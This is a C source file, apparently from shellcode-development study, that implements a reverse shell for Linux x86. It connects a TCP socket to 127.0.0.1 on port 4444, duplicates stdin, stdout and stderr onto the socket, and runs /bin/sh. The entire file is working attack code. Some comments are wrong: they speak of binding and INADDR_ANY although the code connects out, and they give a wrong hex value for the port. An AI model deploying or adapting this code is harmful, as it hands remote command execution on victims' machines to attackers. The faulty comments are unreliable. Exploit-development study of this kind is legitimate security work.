/*

Executable name : reverse-poc
Designed OS     : Linux x86
Author          : wetw0rk
Description     : reverse shell written in C. This is a proof
                  of concept of what we want to accomplish in
                  our shellcode. Heavily commented code below.

Build using these commands:
        gcc -o reverse-poc reverse-poc.c

*/

#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
	/*
	client  : client address
	sock_fd : socket descriptor
	loop    : Used for loop of three I/O connections (STDIN,STDOUT,STDERR)
	*/
	int clnt_fd, loop, sock_fd;
	struct sockaddr_in client;

	/*
	AF_INET         : address family                = 2
	4444            : port to bind to               = 0x17476
	INADDR_ANY      : listen on all interfaces      = 0
	*/
	client.sin_family = AF_INET;
	client.sin_port = htons(4444);
	client.sin_addr.s_addr = inet_addr("127.0.0.1");

	/*
	AF_INET         : address family        = 2
	SOCK_STREAM     : tcp connection        = 1
	IPPROTO_IP      : dummy of ip           = 0
	*/
	sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	// connect
	connect(sock_fd, (struct sockaddr *)&client, sizeof(client));

	/*
	dup2(clnt_fd, 0)        : STDIN         = 0
	dup2(clnt_fd, 1)        : STDOUT        = 1
	dup2(clnt_fd, 2)        : STDERR        = 2
	*/
	for(loop = 0; loop <= 2; loop++)
	{
		dup2(sock_fd, loop);
	}

	// use /bin/sh shell
	execve("/bin/sh", NULL, NULL);

}

